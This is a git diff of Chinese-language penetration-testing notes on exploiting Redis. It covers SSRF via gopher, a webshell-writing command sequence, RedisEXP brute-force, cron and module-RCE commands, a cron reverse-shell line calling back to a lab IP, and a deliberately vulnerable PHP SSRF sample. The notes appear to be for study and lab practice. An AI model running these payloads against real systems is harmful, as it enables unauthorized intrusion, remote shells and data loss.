@@ -40,6 +40,59 @@ RedisEXP_windows_amd64.exe -m brute -r 192.168.110.179 -p 6379 -f pass.txt
 
 ### ssrf打redis
 
+在后面的复现过程中可以发现，高版本的redis默认情况下远程访问必须设置密码，而本地访问仍可以不设置密码，所以现在未授权的情况很多时候都是通过SSRF来打。
+
+利用ssrf打redis的核心就是通过dict或者gopher等协议构造redis的使用的RESP协议与redis通信。
+
+RESP协议比较简单，这里不多介绍，或者说更简单粗暴地方式是，直接通过wireshark抓包，都是明文的ascii字符。
+
+或者更简单地，直接使用工具，这个工具会根据我们的redis命令直接生成gopher请求
+
+```shell
+RedisEXP_windows_amd64.exe -m gopher -r 127.0.0.1 -p 6379 -f getshell
+```
+
+```txt
+config set dir /tmp
+config set dbfilename shell.php
+set 'webshell' '<?php phpinfo();?>'
+bgsave
+quit
+```
+
+![image-20241016113911823](./images/image-20241016113911823.png)
+
+这里有两个坑点：
+
+1. 注意`gopher://ip:port/数据`的是数据部分是需要url编码的，当我们在web端通过ssrf打redis时，在一些情况下（例如触发ssrf的参数在url的query参数里），后端是会自动进行url解码的，这就要求我们将数据部分进行双重url编码
+
+```php
+// 后端示例代码
+<?php
+$url = $_GET['ssrf']; // 替换为目标 URL
+
+echo $url."\n";
+$ch = curl_init($url);
+curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
+$response = curl_exec($ch);
+curl_close($ch);
+
+echo $response; // 输出响应内容
+?>
+```
+
+当我们的请求如下时，解码后的gopher请求实际上是不正确的，这里也没有响应：
+
+![image-20241016141347826](./images/image-20241016141347826.png)
+
+进行双重url编码后就有了响应：
+
+![image-20241016141503569](./images/image-20241016141503569.png)
+
+2. 注意到上面的payload中的quit命令，当我们直接通过命令行发起gopher请求时就类似于使用telnet发起了一个tcp请求，要中断这个请求，要么客户端Ctrl+C，要么输入quit命令让服务端中断。在通过ssrf攻击redis时，如果tcp连接一直不断开，那么请求结不返回果将会一直，所以我们需要使用quit命令主动让redis-server断开连接。
+
+   ![image-20241016141639224](./images/image-20241016141639224.png)
+
 ### redis注入命令
 
 ## 拿到redis权限后如何进一步提权
@@ -146,6 +199,8 @@ set xz "\n * bash -i >& /dev/tcp/192.168.33.131/8888 0>&1\n"
 工具：
 
 ```shell
+# 注意，这个工具会清除目标redis的数据，因为主从同步会同步数据
+# 也不是无法避免，先把目标redis拖库，然后恢复
 RedisEXP_windows_amd64.exe -m cron -r 目标ip -p 目标端口 -w password -L 反连ip -P 反连端口
 ```
 
@@ -248,7 +303,7 @@ $69
 RedisEXP_windows_amd64.exe -m rce -r 192.168.110.177 -p 6379 -w foobared -L 192.168.110.226 -P 2222 -c whoami -rf exp.so
 ```
 
-从工具的输出我们可以看到两点，1，写入恶意so的目录和redis原本的dir设置是一致的（从工具的源码也可以看出），这就减小意味着一般情况下，redis都是有权限写入的；2，我的redis版本较高，7.0.15，这里因为enable-module-command的设置，造成了无法加载模块
+从工具的输出我们可以看到两点，1，写入恶意so的目录和redis原本的dir设置是一致的（从工具的源码也可以看出），这就意味着一般情况下，redis都是有权限写入的；2，我的redis版本较高，7.0.15，这里因为enable-module-command的设置，造成了无法加载模块
 
 ### ![image-20241015162453415](./images/image-20241015162453415.png)
 
@@ -282,6 +337,7 @@ RedisEXP_windows_amd64.exe -m cve -r ip -p port -w password -c pwd
 
 * 探测目录
   * 利用config set dir，前提是有权限，若目录不存在会返回`(error) ERR Changing directory: No such file or directory`
+* 通过dll劫持获取rce，核心还是主从复制的任意文件上传，由于dll劫持笔者不太了解，这里就不多介绍了
 
 ## 总结
 
@@ -292,8 +348,6 @@ RedisEXP_windows_amd64.exe -m cve -r ip -p port -w password -c pwd
 ![image-20241015123643917](./images/image-20241015123643917.png)
 
 ## 工具分析
-
-
 
 ## 实战案例
 
